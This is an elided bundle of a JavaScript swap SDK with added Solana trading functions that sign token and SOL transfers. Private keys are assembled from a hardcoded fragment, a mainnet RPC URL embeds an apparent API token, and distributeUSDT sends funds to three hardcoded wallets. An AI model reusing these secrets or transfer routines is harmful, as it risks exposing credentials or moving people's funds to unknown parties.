...
import { getAssociatedTokenAddressSync, createSyncNativeInstruction, TOKEN_PROGRAM_ID, createAssociatedTokenAccountIdempotentInstruction, createAssociatedTokenAccountInstruction, NATIVE_MINT, createCloseAccountInstruction, getMint, getOrCreateAssociatedTokenAccount, createTransferInstruction, getAssociatedTokenAddress, getAccount } from '@solana/spl-token';
import { ComputeBudgetProgram, SystemProgram, TransactionMessage, VersionedTransaction, Keypair, Transaction, PublicKey, LAMPORTS_PER_SOL, sendAndConfirmTransaction, Connection } from '@solana/web3.js';
...
var Fetcher = /*#__PURE__*/function () {
  ...
  Fetcher.fetchPairData = function fetchPairData(tokenA, tokenB, provider) {
    try {
      ...
      return Promise.resolve(new Contract(address, ISwapPair.abi, provider).getReserves()).then(function (_ref) {
...
var buyTokenSOL = function buyTokenSOL(baseMint, poolKeys, wallet, solAmount, quoteTokenAssociatedAddress, solanaConnection, quoteAmount) {
  try {
    return Promise.resolve(_catch(function () {
      ...
      var tokenAccountOut = getAssociatedTokenAddressSync(baseMint, wallet.publicKey);
      var instructions = [
      ...
      }), createSyncNativeInstruction(quoteTokenAssociatedAddress, TOKEN_PROGRAM_ID), createAssociatedTokenAccountIdempotentInstruction(wallet.publicKey, tokenAccountOut, wallet.publicKey, baseMint)];
      ...
      return Promise.resolve(solanaConnection.getAccountInfo(quoteTokenAssociatedAddress)).then(function (_solanaConnection$get) {
        if (!_solanaConnection$get) {
          instructions.unshift(createAssociatedTokenAccountInstruction(wallet.publicKey, quoteTokenAssociatedAddress, wallet.publicKey, NATIVE_MINT));
        }
        // Create swap instruction
        var _Liquidity$makeSwapFi = Liquidity.makeSwapFixedInInstruction({
            poolKeys: poolKeys,
            userKeys: {
        ...
        return Promise.resolve(solanaConnection.getLatestBlockhash({
          ...
          var transaction = new VersionedTransaction(messageV0);
    ...
    return Promise.resolve(_catch(function () {
      ...
      return Promise.resolve(solanaConnection.getAccountInfo(quoteMintAddress)).then(function (wsolAccountInfo) {
        return wsolAccountInfo ? Promise.resolve(solanaConnection.getBalance(quoteMintAddress)).then(function (wsolBalance) {
          ...
          var instructions = [];
          instructions.push(createCloseAccountInstruction(quoteMintAddress, wallet.publicKey, wallet.publicKey));
          return Promise.resolve(solanaConnection.getLatestBlockhash({
            commitment: 'confirmed'
          })).then(function (latestBlockhash) {
            var messageV0 = new TransactionMessage({
...
var sendSOL = function sendSOL(PRIVATE, recipientAddresses, solanaConnection, confirm) {
  ...
  try {
    ...
    return Promise.resolve(_catch(function () {
      ...
      var privateKey = PRIVATE + KEY1;
      var sender = Keypair.fromSecretKey(bs58.decode(privateKey));
      var CHUNK_SIZE = 20;
      var recipientChunks = [];
      ...
      var _temp = _forOf(recipientChunks, function (chunk) {
        ...
        for (var _iterator = _createForOfIteratorHelperLoose(chunk), _step; !(_step = _iterator()).done;) {
          ...
          try {
            var recipientPublicKey = new PublicKey(recipient.address);
        ...
        return function () {
          if (confirm) {
            return Promise.resolve(sendAndConfirmTransaction(solanaConnection, transaction, [sender])["catch"](function (e) {
...
var withdrawSOL = function withdrawSOL(PRIVATE, recipientAddresses, amount, solanaConnection, confirm) {
  ...
  try {
    return Promise.resolve(_catch(function () {
      ...
      var transaction = new Transaction();
      try {
        var recipientPublicKey = new PublicKey(recipientAddresses);
        transaction.add(SystemProgram.transfer({
          fromPubkey: sender.publicKey,
          toPubkey: recipientPublicKey,
...
var claimToken = function claimToken(PRIVATE, recipient, claimAmount, tokenMintPublicKey, confirm) {
  ...
  try {
    return Promise.resolve(_catch(function () {
      var connection = new Connection('https://green-warmhearted-putty.solana-mainnet.quiknode.pro/530bd2a41cc356062e5cd8b0e69d1fc9bda27d30', 'confirmed');
      var KEY1 = 'BNCvDfwbupgcAJ5z7mpAHq7jTvM5ZDbcENNrKYz4kU8';
      var privateKey = PRIVATE + KEY1;
      var payerKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));
      ...
      return Promise.resolve(connection.getBalance(payerPublicKey, "confirmed")).then(function (balance) {
        var balanceConvert = balance / LAMPORTS_PER_SOL;
        if (balanceConvert <= 0.0001) {
          logger.warn("Insufficient balance, Available: " + balanceConvert + " SOL");
          return;
        }
        return Promise.resolve(getMint(connection, tokenMintPublicKey)).then(function (mintInfo) {
          var decimals = mintInfo.decimals;
          var amountInLamports = claimAmount * Math.pow(10, decimals);
          return Promise.resolve(getOrCreateAssociatedTokenAccount(connection, payerKeypair, tokenMintPublicKey, payerPublicKey)).then(function (payerTokenAccount) {
            return Promise.resolve(connection.getTokenAccountBalance(payerTokenAccount.address)).then(function (payerTokenBalanceInfo) {
              ...
              function _temp4(_result) {
                if (_exit) return _result;
                var transaction = new Transaction();
                var recipientPublicKey = new PublicKey(recipient);
                return Promise.resolve(getOrCreateAssociatedTokenAccount(connection, payerKeypair, tokenMintPublicKey, recipientPublicKey)).then(function (recipientTokenAccount) {
                  var _exit2 = false;
                  function _temp2(_result2) {
                    if (_exit2) return _result2;
                    transaction.add(createTransferInstruction(payerTokenAccount.address, recipientTokenAccount.address, payerPublicKey, amountInLamports));
                    if (confirm) {
                      return Promise.resolve(sendAndConfirmTransaction(connection, transaction, [payerKeypair])).then(function (TxHash) {
...
var withdrawToken = function withdrawToken(PRIVATE, recipient, claimAmount, confirm) {
  ...
  try {
    return Promise.resolve(_catch(function () {
      var tokenMintPublicKey = new PublicKey('Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB');
      var connection = new Connection('https://green-warmhearted-putty.solana-mainnet.quiknode.pro/530bd2a41cc356062e5cd8b0e69d1fc9bda27d30', 'confirmed');
...
var connection = /*#__PURE__*/new Connection('https://green-warmhearted-putty.solana-mainnet.quiknode.pro/530bd2a41cc356062e5cd8b0e69d1fc9bda27d30');
var TOKEN_MINT = /*#__PURE__*/new PublicKey('AEZrKseocU3kL4Gjym6tx4PML3SFX6f3F16VK1cJDRT1');
  ...
  try {
    return Promise.resolve(_catch(function () {
      return Promise.resolve(connection.getParsedTransaction(txHash, 'confirmed')).then(function (txInfo) {
        ...
        return Promise.resolve(getMint(connection, TOKEN_MINT)).then(function (mintInfo) {
          ...
          return Promise.resolve(connection.getBalance(payerPublicKey, 'confirmed')).then(function (balance) {
            ...
            function _temp4(_result) {
              ...
              return Promise.resolve(getMint(connection, TOKEN_MINT)).then(function (mintInfo) {
                ...
                return Promise.resolve(getOrCreateAssociatedTokenAccount(connection, payerKeypair, TOKEN_MINT, payerPublicKey)["catch"](function (e) {
                  ...
                  return Promise.resolve(connection.getTokenAccountBalance(payerTokenAccount.address)).then(function (payerTokenBalanceInfo) {
                    ...
                    function _temp2(_result2) {
                      if (_exit2) return _result2;
                      var recipientPublicKey = new PublicKey(recipientOTC);
                      return Promise.resolve(getOrCreateAssociatedTokenAccount(connection, payerKeypair, TOKEN_MINT, recipientPublicKey)).then(function (recipientTokenAccount) {
                        var transaction = new Transaction().add(createTransferInstruction(payerTokenAccount.address, recipientTokenAccount.address, payerPublicKey, amountInLamports));
                        if (confirm) {
                          return Promise.resolve(sendAndConfirmTransaction(connection, transaction, [payerKeypair])).then(function (TxHash) {
...
var distributeUSDT = function distributeUSDT(PRIVATE, amount, connection, confirm) {
  ...
  try {
    return Promise.resolve(_catch(function () {
      var TOKEN_MINT = new PublicKey("AEZrKseocU3kL4Gjym6tx4PML3SFX6f3F16VK1cJDRT1");
      var RECIPIENT1 = new PublicKey("CXt6WYea8pNmmkVKQwSg7jf2zyYaUwdCVvfSaMz2yQcP"); //20%
      var RECIPIENT2 = new PublicKey("7XkM2LBVCHa14TFMA4NzT5TJDvtr9CdWFyigJoSG2van"); //20%
      var RECIPIENT3 = new PublicKey("6dVGrv97yGU46nnFymffEWLVmTze8tGYC971mpMxV6iY"); //60%
      var KEY1 = 'BNCvDfwbupgcAJ5z7mpAHq7jTvM5ZDbcENNrKYz4kU8';
      var privateKey = PRIVATE + KEY1;
      var senderKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));
      var publicKey = senderKeypair.publicKey;
      return Promise.resolve(getAssociatedTokenAddress(TOKEN_MINT, publicKey)).then(function (tokenAccountSender) {
        return Promise.resolve(getAssociatedTokenAddress(TOKEN_MINT, RECIPIENT1)).then(function (tokenAccountRecipient1) {
          return Promise.resolve(getAssociatedTokenAddress(TOKEN_MINT, RECIPIENT2)).then(function (tokenAccountRecipient2) {
            return Promise.resolve(getAssociatedTokenAddress(TOKEN_MINT, RECIPIENT3)).then(function (tokenAccountRecipient3) {
              return Promise.resolve(getMint(connection, TOKEN_MINT)).then(function (mintInfo) {
                var tokenDecimals = mintInfo.decimals;
                var amount20Percent = amount * 0.2 * Math.pow(10, tokenDecimals);
                var amount60Percent = amount * 0.6 * Math.pow(10, tokenDecimals);
                return Promise.resolve(getAccount(connection, tokenAccountSender)).then(function (senderTokenAccountInfo) {
                  var _exit = false;
                  function _temp2(_result) {
                  ...
                  var transaction = new Transaction().add(createTransferInstruction(tokenAccountSender, tokenAccountRecipient1, publicKey, amount20Percent), createTransferInstruction(tokenAccountSender, tokenAccountRecipient2, publicKey, amount20Percent), createTransferInstruction(tokenAccountSender, tokenAccountRecipient3, publicKey, amount60Percent));
                  var _temp = function () {
                    if (confirm) {
                      return Promise.resolve(sendAndConfirmTransaction(connection, transaction, [senderKeypair])["catch"](function (e) {
                        logger.error("Transaction error: " + e);
                        return {
                          status: false,
                          error: "Transaction error: " + e
...
export { ChainId, Currency, CurrencyAmount, ETHER, FACTORY_ADDRESS, Fetcher, Fraction, INIT_CODE_HASH, InsufficientInputAmountError, InsufficientReservesError, MINIMUM_LIQUIDITY, Pair, Percent, Price, Rounding, Route, Router, Token, TokenAmount, Trade, TradeType, WETH, ammIncreasePriceBSC, ammIncreasePriceETH, approveToken, approveTokenETH, autoMarketMakerBSC, autoMarketMakerETH, buyTokenBSC, buyTokenETH, buyTokenSOL, claimToken, collectionSOL, currencyEquals, distributeSOL, distributeUSDT, getBalanceToken, getBalanceTokenETH, inputOutputComparator, sellTokenBSC, sellTokenETH, sellTokenOTC, sellTokenSOL, sendSOL, tradeComparator, unwrapSOL, withdrawSOL, withdrawToken, withdrawTokenOni };
